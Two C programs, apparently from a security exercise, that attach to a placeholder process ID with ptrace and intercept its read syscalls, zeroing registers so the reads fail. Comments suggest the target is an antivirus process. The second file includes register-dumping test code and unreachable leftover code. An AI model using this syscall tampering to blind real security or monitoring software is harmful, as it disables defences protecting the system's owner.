#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/user.h>

int pid = 0x12345678;

int main(int argc, char **argv) {
    struct user_regs_struct regs;
    int status;

    // Make the malware stop waiting for our output by forking a child process:
    if (fork() != 0) {
        // Kill the parent process so we stop waiting from the malware
        return 0;
    } else {
        // Close the output stream so we stop waiting from the malware
        fclose(stdout);
    }

    // The rest of your code goes here  
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {  // Attach to the process
        return -1;
    }
    waitpid(pid, &status, 0);  // Wait for the process to stop
    if (WIFEXITED(status)) { return -1; } //if proccess ended, finish
    if (ptrace(PTRACE_SYSCALL, pid, NULL , NULL) == -1) { //release untill next syscall
        return -1;
    }

    while(1){
        waitpid(pid, &status, 0); //wait for process to get a syscall
        if (WIFEXITED(status)) { return -1; }    
        ptrace(PTRACE_GETREGS, pid, 1, &regs);
        if (regs.eax == 3 ){  //check if this syscall is read
            regs.eax = 0;
            ptrace(PTRACE_SETREGS, pid, 1, &regs);
            ptrace(PTRACE_SYSCALL, pid, NULL , NULL);//release     
        }
        else{
            ptrace(PTRACE_SYSCALL, pid, NULL , NULL);//release
        }
        //waitpid(pid, &status, 0); //wait untill syscall returns
        //if (WIFEXITED(status)) { return -1; }
        //ptrace(PTRACE_SYSCALL, pid, NULL , NULL); //let the antivirus continue working untill next syscall             
    }
    return 0;
}



#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/user.h>

int pid = 0x12345678;

int main(int argc, char **argv) {
    struct user_regs_struct regs;
    int status = 0;

    ptrace(PTRACE_ATTACH, pid, NULL, NULL);
    waitpid(pid, 0, 0); //wait for process to get a syscall

    while(1){
        status++;
        ptrace(PTRACE_SYSCALL, pid, NULL , NULL);
        waitpid(pid, 0, 0); //wait for process to get a syscall
        ptrace(PTRACE_GETREGSET, pid, NULL, &regs);
        printf("regs: eax:%lx ebx:%lx, ecx:%lx ,edx:%lx esp:%lx,eip:%lx\n",regs.eax,regs.ebx,regs.ecx,regs.edx,regs.esp,regs.eip);
        if (status>100){
            puts("finished");
            break;
        }
    }
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    return 0;

    // Make the malware stop waiting for our output by forking a child process:
    if (fork() != 0) {
        // Kill the parent process so we stop waiting from the malware
        return 0;
    } else {
        // Close the output stream so we stop waiting from the malware
        fclose(stdout);
    }

    // The rest of your code goes here  
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {  // Attach to the process
        return -1;
    }

    waitpid(pid, &status, 0);  // Wait for the process to stop
    if (WIFEXITED(status)) { return -1; } //if proccess ended, finish

    status = 0;

    while(1){
        ptrace(PTRACE_SYSCALL, pid, NULL , NULL);
        waitpid(pid, &status, 0); //wait for process to get a syscall
        ptrace(PTRACE_GETREGS, pid, NULL, &regs);
        if (regs.eax==3){
            regs.edx = 0;
            regs.eax = 0;
            regs.ecx = 0;
            ptrace(PTRACE_SETREGS, pid, NULL, &regs);
        }
    }
    return 0;
}


/*
            ptrace(PTRACE_GETREGS, pid, NULL, &regs);
            regs.eax=0;
            ptrace(PTRACE_SETREGS, pid, NULL, &regs);



            regs.ecx = 1;
            ptrace(PTRACE_GETREGS, pid, 1, &regs);
            if (regs.ecx == 0){
                kill(pid,9);
            }
            */

